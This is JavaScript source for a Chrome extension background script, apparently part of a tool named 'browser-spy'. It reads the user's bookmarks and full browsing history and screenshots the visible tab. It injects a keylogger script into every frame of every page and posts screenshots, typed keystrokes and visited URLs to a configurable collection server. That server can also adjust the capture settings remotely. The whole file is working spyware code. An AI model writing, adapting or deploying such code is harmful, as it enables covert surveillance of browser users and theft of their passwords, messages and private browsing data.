try{
	var hosts = Array("http://localhost/browser-spy/server/php/");
	var id_u = "josendo";
	var tictac = 60000;
	var image;
	var tmpval, n, v, t = window.location.href;
	var let_img = true;
	var let_html = false;
	var let_keylogger = true;
	var turnon_keylogger = true;
	var debugging = true;

	//markers tree, called only when the browser starts or the plugin is installed
	chrome.bookmarks.getTree(function(results){
		console.log(results);
	});

	//history, called only when the browser starts or the plugin is installed
	chrome.history.search({text:"",startTime:0,maxResults:99999999}, function(history){
		console.log(history);
	});

	chrome.runtime.onMessage.addListener(
	  function(data, sender, sendResponse) {
	    chrome.tabs.captureVisibleTab(null, {}, function (image) {
	    	if(data.type == "spy"){
		    	if(let_img)
			    	data.data.img = image;
			   	if(!let_html)
			   		delete data.data.html;
			   	if(!let_keylogger)
			   		delete data.data.keylogger_text;

			   	data.data.id_u = id_u;

			   	for(var host in hosts)
					$.ajax({
						url : hosts[host]+"receive.php",
						type : "POST",
						data : data.data,
						success : function(d){
							try{
								d = JSON.parse(d);
								tictac = Number(d.tictac);
								let_img = Number(d.let_img) == 1;
								let_html = Number(d.let_html) == 1;
								let_keylogger = Number(d.let_keylogger) == 1;
							}catch(e){
								if(debugging)
									alert("spy: " + d);
							}
						}, error : function(x, y, z){
						}, complete : function(a, b){
						}
					});
			}else if(data.type == "history"){
			   	for(var host in hosts)
					$.ajax({
						url : hosts[host] + "history.php",
						type : "POST",
						data : {
							url : data.data.url,
							id_u : id_u
						},
						success : function(d){
							if(d.trim().length > 0 && debugging)
								alert("history: " + d);
						}, error : function(x, y, z){
						}, complete : function(a, b){
						}
					});
			}
		});

		sendResponse({
			tictac : tictac,
			let_img : let_img,
			let_html : let_html,
			let_keylogger : let_keylogger
		});
	});

	chrome.tabs.onUpdated.addListener(function(tabId, changeInfo) {
	    if (changeInfo.status === 'complete') {
	        chrome.tabs.executeScript(tabId, {
	            allFrames: true, 
	            file: 'keylogger.js'
	        });
	    }
	});
}catch(e){
	console.log(e);
}